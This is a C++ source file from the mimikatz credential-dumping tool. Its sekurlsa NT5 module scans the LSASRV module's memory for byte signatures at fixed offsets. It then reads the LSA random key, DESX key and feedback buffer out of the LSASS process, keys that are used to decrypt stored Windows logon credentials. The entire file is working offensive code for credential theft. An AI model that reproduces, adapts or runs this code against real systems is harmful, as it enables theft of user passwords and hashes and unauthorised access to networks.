/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "keys_nt5.h"
#include "..\..\global.h"
PBYTE * mod_mimikatz_sekurlsa_keys_nt5::g_pRandomKey = NULL, * mod_mimikatz_sekurlsa_keys_nt5::g_pDESXKey = NULL;

#ifdef _M_X64
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]	= {0x33, 0xdb, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3};
LONG OFFS_WNT5_g_pRandomKey							= -(6 + 2 + 5 + sizeof(long));
LONG OFFS_WNT5_g_cbRandomKey						= OFFS_WNT5_g_pRandomKey - (3 + sizeof(long));
LONG OFFS_WNT5_g_pDESXKey							= OFFS_WNT5_g_cbRandomKey - (2 + 5 + sizeof(long));
LONG OFFS_WNT5_g_Feedback							= OFFS_WNT5_g_pDESXKey - (3 + 7 + 6 + 2 + 5 + 5 + sizeof(long));
#elif defined _M_IX86
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]	= {0x84, 0xc0, 0x74, 0x44, 0x6a, 0x08, 0x68};
LONG OFFS_WNT5_g_Feedback							= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
LONG OFFS_WNT5_g_pRandomKey							= OFFS_WNT5_g_Feedback	+ sizeof(long) + 5 + 2 + 2 + 2;
LONG OFFS_WNT5_g_pDESXKey							= OFFS_WNT5_g_pRandomKey+ sizeof(long) + 2;
LONG OFFS_WNT5_g_cbRandomKey						= OFFS_WNT5_g_pDESXKey	+ sizeof(long) + 5 + 2;
#endif

bool mod_mimikatz_sekurlsa_keys_nt5::searchAndInitLSASSData()
{
	PBYTE ptrBase = NULL;
	DWORD mesSucces = 0;
	if(mod_memory::searchMemory(mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr, mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr + mod_mimikatz_sekurlsa::localLSASRV.modBaseSize, PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &ptrBase, sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY)))
	{
#ifdef _M_X64
		PBYTE g_Feedback		= reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT5_g_Feedback)	+ sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_Feedback));
		g_pRandomKey			= reinterpret_cast<PBYTE *>((ptrBase + OFFS_WNT5_g_pRandomKey)	+ sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_pRandomKey));
		g_pDESXKey				= reinterpret_cast<PBYTE *>((ptrBase + OFFS_WNT5_g_pDESXKey)	+ sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_pDESXKey));
		PDWORD g_cbRandomKey	= reinterpret_cast<PDWORD >((ptrBase + OFFS_WNT5_g_cbRandomKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_cbRandomKey));
#elif defined _M_IX86
		PBYTE g_Feedback		= *reinterpret_cast<PBYTE  *>(ptrBase + OFFS_WNT5_g_Feedback);
		g_pRandomKey			= *reinterpret_cast<PBYTE **>(ptrBase + OFFS_WNT5_g_pRandomKey);
		g_pDESXKey				= *reinterpret_cast<PBYTE **>(ptrBase + OFFS_WNT5_g_pDESXKey);
		PDWORD g_cbRandomKey	= *reinterpret_cast<PDWORD *>(ptrBase + OFFS_WNT5_g_cbRandomKey);
#endif
		*g_Feedback = NULL; *g_pRandomKey = NULL; *g_pDESXKey = NULL; *g_cbRandomKey = NULL;

		mesSucces = 0;
		if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (g_Feedback - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), g_Feedback, 8, mod_mimikatz_sekurlsa::hLSASS))
			mesSucces++;
		if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_cbRandomKey) - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), g_cbRandomKey, sizeof(DWORD), mod_mimikatz_sekurlsa::hLSASS))
			mesSucces++;
		if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_pRandomKey) - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), mod_mimikatz_sekurlsa::hLSASS))
		{
			mesSucces++;
			*g_pRandomKey = new BYTE[*g_cbRandomKey];
			if(mod_memory::readMemory(ptrBase, *g_pRandomKey, *g_cbRandomKey, mod_mimikatz_sekurlsa::hLSASS))
				mesSucces++;
		}
		if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_pDESXKey) - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), mod_mimikatz_sekurlsa::hLSASS))
		{
			mesSucces++;
			*g_pDESXKey = new BYTE[144];
			if(mod_memory::readMemory(ptrBase, *g_pDESXKey, 144, mod_mimikatz_sekurlsa::hLSASS))
				mesSucces++;
		}
	}
	else (*outputStream) << L"mod_memory::searchMemory NT5 " << mod_system::getWinError() << endl; 
	return (mesSucces == 6);
}

bool mod_mimikatz_sekurlsa_keys_nt5::uninitLSASSData()
{
	if(g_pRandomKey && *g_pRandomKey)
		delete[] *g_pRandomKey;
	if(g_pDESXKey && *g_pDESXKey)
		delete[] *g_pDESXKey;

	return true;
}
